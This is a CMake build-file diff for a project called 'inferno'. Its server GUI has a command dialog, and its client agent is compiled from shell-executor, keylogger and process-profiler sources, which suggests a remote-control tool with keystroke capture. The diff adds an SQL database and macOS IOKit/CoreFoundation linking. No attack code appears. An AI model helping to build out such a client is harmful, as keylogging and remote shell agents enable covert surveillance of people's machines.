@@ -16,7 +16,7 @@ set(CMAKE_AUTOMOC ON)
 set(CMAKE_AUTORCC ON)
 set(CMAKE_AUTOUIC ON)
 
-find_package(Qt6 REQUIRED COMPONENTS Core Widgets Gui)
+find_package(Qt6 REQUIRED COMPONENTS Core Widgets Gui Sql)
 
 # ==========================================
 # 2. Common Library (Networking & Protocol)
@@ -36,13 +36,15 @@ add_executable(inferno_server
     server/src/MainWindow.cpp
     server/src/DataStreamWidget.cpp
     server/src/CommandDialog.cpp
+    server/src/Inferno_Database.cpp
     server/include/server.hpp
     server/include/MainWindow.hpp
     server/include/DataStreamWidget.hpp
     server/include/CommandDialog.hpp
+    server/include/Inferno_Database.hpp
     server/resources/styles.qrc
 )
-target_link_libraries(inferno_server PRIVATE inferno_common Qt6::Widgets Qt6::Gui Qt6::Core)
+target_link_libraries(inferno_server PRIVATE inferno_common Qt6::Widgets Qt6::Gui Qt6::Core Qt6::Sql)
 
 # ==========================================
 # 4. Client Agent Executable 
@@ -59,7 +61,9 @@ target_link_libraries(inferno_client PRIVATE inferno_common)
 if(APPLE)
     find_library(CORE_GRAPHICS CoreGraphics)
     find_library(CARBON Carbon)
-    target_link_libraries(inferno_client PRIVATE ${CORE_GRAPHICS} ${CARBON})
+    find_library(IO_KIT IOKit)
+    find_library(CORE_FOUNDATION CoreFoundation)
+    target_link_libraries(inferno_client PRIVATE ${CORE_GRAPHICS} ${CARBON} ${IO_KIT} ${CORE_FOUNDATION})
 endif()
 
 # ==========================================
@@ -73,17 +77,20 @@ add_executable(inferno_tests
     tests/packet_test.cpp
     tests/shell_test.cpp
     tests/keylogger_test.cpp
+    tests/database_test.cpp
     server/src/server.cpp
+    server/src/Inferno_Database.cpp
+    server/include/Inferno_Database.hpp
     server/include/server.hpp
     client/src/ProcessProfiler.cpp
     client/src/ShellExecutor.cpp
     client/src/KeyLogger.cpp
 )
-target_link_libraries(inferno_tests PRIVATE inferno_common Qt6::Widgets Qt6::Gui Qt6::Core)
+target_link_libraries(inferno_tests PRIVATE inferno_common Qt6::Widgets Qt6::Gui Qt6::Core Qt6::Sql)
 target_compile_definitions(inferno_tests PRIVATE INFERNO_TESTING)
 
 if(APPLE)
-    target_link_libraries(inferno_tests PRIVATE ${CORE_GRAPHICS} ${CARBON})
+    target_link_libraries(inferno_tests PRIVATE ${CORE_GRAPHICS} ${CARBON} ${IO_KIT} ${CORE_FOUNDATION})
 endif()
 
 add_test(NAME CoreNetworkingTests COMMAND inferno_tests)
